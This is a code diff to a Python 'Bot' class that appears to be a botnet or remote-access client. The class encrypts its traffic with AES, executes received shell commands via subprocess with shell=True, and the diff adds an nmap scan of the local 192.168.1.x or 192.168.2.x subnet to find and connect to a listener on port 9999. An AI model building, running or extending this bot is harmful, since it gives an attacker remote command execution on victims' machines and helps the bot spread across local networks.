@@ -1,5 +1,6 @@
 from Crypto.Cipher import AES
 from Crypto import Random
+import nmap
 import subprocess
 import base64
 import hashlib
@@ -14,20 +15,18 @@ class Bot:
 	PADDING = '\0'
 	SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	server = 'localhost'
-	port = 8888
+	port = 9999
 
 	def __init__(self):
 		self.key = Random.new().read(self.BLOCK_SIZE)
-		self.connect(self.server, self.port)
+		self.scan_network()
 
 	def connect(self, serv, portNum):
-		self.server = str(serv)
-		self.port = portNum
 		try:
-			self.SERVER.connect((self.serv, self.portNum))
+			self.SERVER.connect((serv, portNum))
 		except:
-			print "[-] Cannot Connect"
-			sys.exit(1)
+			print("[-] Could Not Connect")	
+		
 
 
 	def send_message(self, message):
@@ -50,7 +49,7 @@ class Bot:
 		digest = ciphertext[:16]
 		ciphertext = ciphertext[16:]
 		if str(digest) != str(self.get_hmac(ciphertext)):
-			print "[-] MESSAGE TAMPERED"
+			print("[-] MESSAGE TAMPERED")
 		iv = base64.b64decode(ciphertext)[:16]
 		cipher = AES.new(self.key, AES.MODE_CBC, iv)
 		return cipher.decrypt(base64.b64decode(ciphertext)[16:])\
@@ -79,6 +78,33 @@ class Bot:
 		ps =  subprocess.Popen(cmd, stdout=subprocess.PIPE, \
 			stderr=subprocess.STDOUT, shell=True)
 		return ps.communicate()[0]
-
+	
+	def get_local_ip(self):
+		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		s.connect(("gmail.com",80))
+		ip = s.getsockname()[0]
+		s.close()
+		return ip
+	
+	def scan_network(self):
+		nm = nmap.PortScanner()
+		ip_range = self.get_local_ip()[:-2]
+		
+		if ip_range == "192.168.2":
+			nm.scan('192.168.2.0-255', str(self.port))
+			for host in nm.all_hosts():
+				state = nm[host]['tcp'][self.port]['state']
+				if state == 'open':
+					self.connect(host, self.port)
+				else:
+					print("%s Closed" % host)
+		elif ip_range == "192.168.1":
+			nm.scan('192.168.1.0-255', str(self.port))
+			for host in nm.all_hosts():
+				state = nm[host]['tcp'][self.port]['state']
+				if state == 'open':
+					self.connect(host, self.port)
+				else:
+					print("%s Closed" % host)
 
 bot = Bot()
